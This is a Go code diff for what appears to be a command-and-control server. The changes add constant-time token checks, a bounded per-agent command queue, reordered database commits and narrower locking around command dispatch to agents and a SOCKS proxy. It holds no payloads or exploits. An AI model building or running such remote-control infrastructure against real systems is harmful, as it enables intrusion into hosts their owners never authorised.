@@ -9,9 +9,10 @@ import (
 	"c2/internal/templates"
 	"c2/internal/common/config"
 	"c2/internal/common/interfaces"
-	"c2/internal/common/logging" // ADD THIS IMPORT
+	"c2/internal/common/logging"
 	pb "c2/proto"
 	"context"
+	"crypto/subtle"
 	"database/sql"
 	"encoding/json"
 	"fmt"
@@ -19,7 +20,7 @@ import (
 	"log"
 	"net"
 	"net/http"
-	"os" // ADD THIS IMPORT
+	"os"
 	"strconv"
 	"strings"
 	"sync"
@@ -142,7 +143,7 @@ func (s *GRPCServer) RegisterLogEndpoint(mux *http.ServeMux) {
 
 		token := authHeader[7:]
 		expectedToken := os.Getenv("API_PASSWORD")
-		if expectedToken == "" || token != expectedToken {
+		if expectedToken == "" || subtle.ConstantTimeCompare([]byte(token), []byte(expectedToken)) != 1 {
 			http.Error(w, "Unauthorized: invalid token", http.StatusUnauthorized)
 			return
 		}
@@ -231,6 +232,10 @@ type Command struct {
 	Timestamp    string `json:"ts"`
 }
 
+// maxCommandBufferSize is the maximum number of pending commands per agent.
+// If exceeded, the oldest commands are dropped to prevent unbounded memory growth.
+const maxCommandBufferSize = 10000
+
 // CommandBuffer now stores Command objects instead of strings
 type CommandBuffer struct {
 	Mutex         sync.Mutex
@@ -252,6 +257,20 @@ func NewCommandBuffer() *CommandBuffer {
 	}
 }
 
+// appendCommand adds a command to the buffer for the given client, enforcing the max buffer size.
+// Caller must hold s.Mutex.
+func (s *GRPCServer) appendCommand(clientID string, cmd Command) {
+	if s.CommandBuffer[clientID] == nil {
+		s.CommandBuffer[clientID] = make([]Command, 0)
+	}
+	if len(s.CommandBuffer[clientID]) >= maxCommandBufferSize {
+		dropped := len(s.CommandBuffer[clientID]) - maxCommandBufferSize + 1
+		s.CommandBuffer[clientID] = s.CommandBuffer[clientID][dropped:]
+		log.Printf("[CommandBuffer] WARNING: Buffer full for agent %s, dropped %d oldest command(s)", clientID, dropped)
+	}
+	s.CommandBuffer[clientID] = append(s.CommandBuffer[clientID], cmd)
+}
+
 func (c *GRPCServer) StoreCommand(clientID string, command string, username string) {
 	// Parameter validation
 	if clientID == "" || command == "" || username == "" {
@@ -259,10 +278,8 @@ func (c *GRPCServer) StoreCommand(clientID string, command string, username stri
 		return
 	}
 
-	c.Mutex.Lock()
-	defer c.Mutex.Unlock()
-
-	// Start transaction...
+	// Perform DB transaction WITHOUT holding the mutex to avoid blocking
+	// the command buffer during potentially slow database calls.
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
@@ -291,6 +308,16 @@ func (c *GRPCServer) StoreCommand(clientID string, command string, username stri
 		return
 	}
 
+	// Commit the DB transaction BEFORE dispatching to the buffer.
+	// This ensures we don't dispatch commands that fail to persist.
+	if err := tx.Commit(); err != nil {
+		log.Printf("[StoreCommand] Failed to commit transaction: %v", err)
+		return
+	}
+
+	// Now hold the mutex only for the in-memory buffer append.
+	c.Mutex.Lock()
+
 	// Create command object without trying to parse the command as JSON
 	// Translate command name to numeric ID for payload dispatch
 	cmdType := commands.GetCommandID(command)
@@ -304,20 +331,11 @@ func (c *GRPCServer) StoreCommand(clientID string, command string, username stri
 		Timestamp: time.Now().Format("2006-01-02T15:04:05.000000"),
 	}
 
-	// Initialize the slice if it doesn't exist
-	if c.CommandBuffer[clientID] == nil {
-		c.CommandBuffer[clientID] = make([]Command, 0)
-	}
-
-	c.CommandBuffer[clientID] = append(c.CommandBuffer[clientID], cmd)
+	c.appendCommand(clientID, cmd)
+	c.Mutex.Unlock()
 
 	log.Printf("[StoreCommand] Successfully stored command for client %s with ID %d",
 		clientID, commandDBID)
-
-	if err := tx.Commit(); err != nil {
-		log.Printf("[StoreCommand] Failed to commit transaction: %v", err)
-		return
-	}
 }
 
 // stripFilePathFromCommand removes the file path from commands that include files
@@ -417,11 +435,8 @@ func (s *GRPCServer) GetCommand(clientID string) ([]string, bool) {
 	cmdsCopy := make([]Command, len(cmds))
 	copy(cmdsCopy, cmds)
 
-	// Clear the buffer immediately while we still have the lock
-	s.CommandBuffer[clientID] = []Command{}
-
 	s.Mutex.Unlock()
-	// ========== CRITICAL SECTION END (lock held for ~5 lines instead of 50+) ==========
+	// ========== CRITICAL SECTION END ==========
 
 	// Log command dispatch concisely
 	for _, cmd := range cmdsCopy {
@@ -436,8 +451,14 @@ func (s *GRPCServer) GetCommand(clientID string) ([]string, bool) {
 	cmdJSON, err := json.Marshal(cmdsCopy)
 	if err != nil {
 		log.Printf("[CMD] Failed to marshal commands for agent=%s: %v", clientID, err)
+		// Marshal failed — do NOT clear the buffer so commands are not lost
 		return nil, false
 	}
+
+	// Marshal succeeded — now clear the buffer
+	s.Mutex.Lock()
+	s.CommandBuffer[clientID] = []Command{}
+	s.Mutex.Unlock()
 
 	return []string{string(cmdJSON)}, true
 }
@@ -1205,12 +1226,6 @@ func (s *GRPCServer) QueueDownloadCommand(clientID string, downloadCmd map[strin
 	log.Printf("[QueueDownloadCommand] Starting to queue command for client %s", clientID)
 	log.Printf("[QueueDownloadCommand] Current command buffer state: %+v", s.CommandBuffer)
 
-	// Initialize the slice if it doesn't exist
-	if s.CommandBuffer[clientID] == nil {
-		s.CommandBuffer[clientID] = make([]Command, 0)
-		log.Printf("[QueueDownloadCommand] Initialized new command buffer for client %s", clientID)
-	}
-
 	cmdStr := downloadCmd["command"].(string)
 	cmdType := commands.GetCommandID(cmdStr)
 	cmd := Command{
@@ -1226,11 +1241,11 @@ func (s *GRPCServer) QueueDownloadCommand(clientID string, downloadCmd map[strin
 		Timestamp:    time.Now().Format("2006-01-02T15:04:05.000000"),
 	}
 
-	log.Printf("[QueueDownloadCommand] Created command: %+v", cmd)
+	log.Printf("[QueueDownloadCommand] Created command for client %s", clientID)
 
-	s.CommandBuffer[clientID] = append(s.CommandBuffer[clientID], cmd)
+	s.appendCommand(clientID, cmd)
 
-	log.Printf("[QueueDownloadCommand] Buffer state after append: %+v", s.CommandBuffer[clientID])
+	log.Printf("[QueueDownloadCommand] Buffer size after append: %d", len(s.CommandBuffer[clientID]))
 
 	return nil
 }
@@ -1440,10 +1455,7 @@ func (s *GRPCServer) startSocksHTTPServer(agentID string, port int) error {
 			Timestamp:   time.Now().UTC().Format(time.RFC3339),
 		}
 
-		if s.CommandBuffer[targetAgentID] == nil {
-			s.CommandBuffer[targetAgentID] = make([]Command, 0)
-		}
-		s.CommandBuffer[targetAgentID] = append(s.CommandBuffer[targetAgentID], cmd)
+		s.appendCommand(targetAgentID, cmd)
 
 		log.Printf("[SOCKS-HTTP] Queued command for agent %s (buffer size: %d)", targetAgentID, len(s.CommandBuffer[targetAgentID]))
 		return nil
@@ -1921,10 +1933,7 @@ func (s *GRPCServer) processReceivedMessage(msg *pb.StreamMessage) {
 
 		// Add command to buffer
 		s.Mutex.Lock()
-		if s.CommandBuffer[commandData.AgentID] == nil {
-			s.CommandBuffer[commandData.AgentID] = make([]Command, 0)
-		}
-		s.CommandBuffer[commandData.AgentID] = append(s.CommandBuffer[commandData.AgentID], cmd)
+		s.appendCommand(commandData.AgentID, cmd)
 
 		// Log buffer status without showing data
 		bufferSize := len(s.CommandBuffer[commandData.AgentID])
